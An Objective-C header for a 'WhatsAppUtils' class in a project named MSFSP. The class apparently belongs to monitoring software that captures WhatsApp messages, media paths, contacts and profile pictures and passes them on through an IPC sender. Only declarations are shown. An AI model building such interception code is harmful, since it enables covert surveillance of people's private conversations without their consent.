/**
 - Project name :  MSFSP
 - Class name   :  WhatsAppUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import <Foundation/Foundation.h>

// -- for video and audio
static NSString * const kWhatsAppUserIdKey						= @"userId";
static NSString * const kWhatsAppUserDisplayNameKey				= @"userDisplayName";
static NSString * const kWhatsAppUserStatusMessageKey			= @"userStatusMessage";
static NSString * const kWhatsAppSenderImageProfileDataKey		= @"senderImageProfileData";
static NSString * const kWhatsAppDirectionKey					= @"direction";
static NSString * const kWhatsAppCaptionKey                     = @"caption";
static NSString * const kWhatsAppConversationIDKey				= @"conversationID";
static NSString * const kWhatsAppConversationNameKey			= @"conversationName";
static NSString * const kWhatsAppConversationProfilePicDataKey	= @"conversationProfilePicData";
static NSString * const kWhatsAppParticipantsKey				= @"participants";

// -- for video only
static NSString * const kWhatsAppVideoPathKey					= @"videoPath";
static NSString * const kWhatsAppVideoThumbnailData				= @"videoThumbnailData";

// -- for audio only
static NSString * const kWhatsAppAudioPathKey					= @"audioPath";


@class FMDatabase;
@class SharedFile2IPCSender;

@interface WhatsAppUtils : NSObject {
@private
	FMDatabase		*mWhatsAppDB;
	NSDictionary	*mAccountInfo;
	
	SharedFile2IPCSender	*mIMSharedFileSender;
}


@property(nonatomic,retain) NSDictionary *mAccountInfo;

@property (retain) SharedFile2IPCSender	*mIMSharedFileSender;

+ (id) sharedWhatsAppUtils;

- (NSDictionary *) accountInfo:(NSString *) aUserID 
					  userName:(NSString *) aUserName;

- (id) incomingMessageParts:(id) aArg;  

- (void) createIncomingWhatsAppEvent:(id) aIncomingEvent;

- (void) createOutgoingWhatsAppEvent:(id) aOutGoingEvent; 

- (BOOL)		shouldProcess: (id) aOutGoingEvent;
						 
@end
